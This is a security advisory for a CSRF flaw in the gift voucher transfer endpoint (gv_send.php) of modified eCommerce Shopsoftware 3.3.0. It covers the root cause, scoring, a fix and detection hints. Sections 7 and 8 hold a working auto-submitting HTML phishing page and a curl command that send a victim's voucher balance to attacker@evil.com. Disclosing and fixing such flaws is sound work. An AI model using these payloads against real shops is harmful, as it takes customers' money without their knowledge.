# Security Advisory: Cross-Site Request Forgery (CSRF) in gv_send.php — Gift Voucher Hijack

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
> **CWE:** CWE-352: Cross-Site Request Forgery (CSRF)
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 is vulnerable to Cross-Site Request Forgery in `gv_send.php`. The gift voucher transfer endpoint processes state-changing actions without validating a CSRF token. An attacker who tricks an authenticated customer with a gift voucher balance into visiting a malicious page can silently transfer that balance to an attacker-controlled email address. Other sensitive endpoints in the same application (`account_edit.php`, `account_password.php`) correctly implement CSRF protection; `gv_send.php` does not.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: gv_send.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

### Unaffected Products

- `account_edit.php`, `account_password.php`, `account_delete.php` — CSRF protected via `check_secure_form()`.

---

## 3. Vulnerability Description

The `gv_send.php` endpoint handles gift voucher transfers when `GET action=process` is set. It reads `$_POST['to_email']`, `$_POST['amount']`, and other fields to debit the authenticated user's gift voucher balance and send a voucher to the specified email. The endpoint does not call `check_secure_form()` or any equivalent token validation before processing the transfer, making it trivially exploitable via CSRF.

**Root cause:**

```php
// gv_send.php:88 (simplified)
if (isset($_GET['action']) && $_GET['action'] == 'process') {
    // ← NO check_secure_form() call here
    // Other endpoints like account_edit.php begin with:
    // check_secure_form(); // which verifies $_POST[CSRFName] == $_SESSION['CSRFToken']

    $gv_code = create_coupon_code(10);
    $to_email = $_POST['to_email'];
    $amount   = $_POST['amount'];

    // Debit victim's balance
    xtc_db_query("UPDATE ".TABLE_COUPON_GV_CUSTOMER."
                     SET amount = '".xtc_db_input($new_amount)."'
                   WHERE customer_id = '".(int)$_SESSION['customer_id']."'");

    // Create voucher for attacker's email
    xtc_db_query("INSERT INTO ".TABLE_COUPONS." ...");
    xtc_php_mail(..., $to_email, ...);
}
```

### Necessary Conditions

- **Authentication:** Customer account with gift voucher balance > 0 must be logged in
- **User interaction:** Required — victim must visit attacker-controlled page or click malicious link
- **Attack vector:** Network
- **Preconditions:** Victim session active; gift voucher balance present

---

## 4. Impact

- **Confidentiality:** None
- **Integrity:** Low — victim's gift voucher balance is transferred to attacker; voucher record created
- **Availability:** None

The practical financial impact depends on the victim's voucher balance. In a shop with high-value vouchers this could represent significant monetary loss.

---

## 5. Classification

### CVSS

- **Score:** 4.3
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | Required |
| Scope (S) | Unchanged |
| Confidentiality (C) | None |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-352: Cross-Site Request Forgery (CSRF)

### CAPEC

- CAPEC-62: Cross-Site Request Forgery

---

## 6. Exploitation Scenario

1. Attacker identifies that the target shop uses gift vouchers and that customers may have balances.
2. Attacker crafts a malicious HTML page with an auto-submitting form targeting `gv_send.php?action=process`.
3. Attacker distributes the page (phishing email, forum post, malicious ad).
4. When a logged-in customer with a voucher balance visits the page, the browser auto-submits the form with the victim's cookies.
5. The shop processes the request, debiting the victim's balance and sending a voucher to `attacker@evil.com`.
6. The attacker redeems the voucher at checkout to obtain goods for free.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): gv_send.php (line 88)
Parameter(s): to_email, to_name, send_name, amount, message (POST)
              action=process (GET)
Method: GET+POST · Authentication: Customer session required
```

### Example Request

```http
POST /gv_send.php?action=process HTTP/1.1
Host: TARGET
Cookie: MODsid=<CUSTOMER_SESSION_ID>
Content-Type: application/x-www-form-urlencoded
Referer: http://evil.com/

to_email=attacker%40evil.com&to_name=Attacker&send_name=Friend&amount=10&message=Gift
```

*(No CSRF token required — request accepted and processed)*

### Observed Response

```text
HTTP/1.1 200 OK
[Redirect to account page; voucher 964c2df707 created and emailed to attacker@evil.com]
```

### Result

Confirmed in authorized lab. Customer ID=1 had balance 100.00 EUR. After CSRF request: balance = 90.00 EUR. Voucher `964c2df707` created in `coupon_send` table with `to_customer_email=attacker@evil.com`.

**Evidence:** `coupon_gv_customer` table: `amount` reduced 100.00 → 90.00; `coupon_send` record created with attacker email.

---

## 8. Proof of Concept

```html
<!-- V05 PoC — CSRF Gift Voucher Hijack -->
<!-- Host this file on a web server and trick an authenticated customer into visiting it -->
<!DOCTYPE html>
<html>
<head><title>Você ganhou um prêmio!</title></head>
<body>
  <h1>Parabéns! Você foi selecionado para um prêmio.</h1>
  <p>Clique abaixo para resgatar:</p>

  <form id="f" action="http://TARGET/gv_send.php?action=process" method="POST">
    <input type="hidden" name="to_email"  value="attacker@evil.com">
    <input type="hidden" name="to_name"   value="Attacker">
    <input type="hidden" name="send_name" value="Your Friend">
    <input type="hidden" name="amount"    value="10">
    <input type="hidden" name="message"   value="Congratulations!">
  </form>

  <script>
    // Auto-submit on page load — no interaction required
    document.getElementById('f').submit();
  </script>
</body>
</html>
```

**Manual curl equivalent:**

```bash
# Requires a valid customer session with GV balance
curl -s -b "MODsid=<CUSTOMER_SESSION_ID>" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
  -X POST "http://TARGET/gv_send.php?action=process" \
  -d "to_email=attacker@evil.com&to_name=Attacker&send_name=Friend&amount=10&message=Gift"
```

### Expected Result

```text
HTTP: 200 (redirect to account page)
Database: coupon_gv_customer[victim_id].amount -= 10
          coupon_send record created: to_customer_email=attacker@evil.com
          coupon code emailed to attacker
```

### PoC Limitations

- Does not cause service disruption.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Deploy authorized instance. Create a customer account with gift voucher balance (e.g., 100.00).
2. Log in as that customer. Keep the session active.
3. From a different browser/tab, serve the PoC HTML above.
4. Open the PoC page while the customer session is active (simulating the victim visiting a malicious page).
5. Confirm balance decreased by 10.00 and voucher record created for attacker's email.

---

## 10. Mitigation

- Add `check_secure_form()` at the top of the `action=process` branch in `gv_send.php`.
- Implement the same SameSite=Strict cookie attribute used elsewhere.
- Add `Referer` / `Origin` header validation as a secondary control.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// gv_send.php — add at the start of the process block:
if (isset($_GET['action']) && $_GET['action'] == 'process') {
    check_secure_form();  // ← Add this line (already present in account_edit.php)
    // ... rest of processing
}
```

---

## 12. Detection and Indicators

- Unexpected POST requests to `gv_send.php?action=process` from unusual Referer headers.
- Gift voucher balance decreases not initiated by the customer.
- Multiple voucher creations in a short time window.

### Example Log Search

```text
grep "gv_send.php.*process" access.log | grep "POST"
# Check for requests where Referer is not the shop's own domain
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-352: https://cwe.mitre.org/data/definitions/352.html
- CAPEC-62: https://capec.mitre.org/data/definitions/62.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
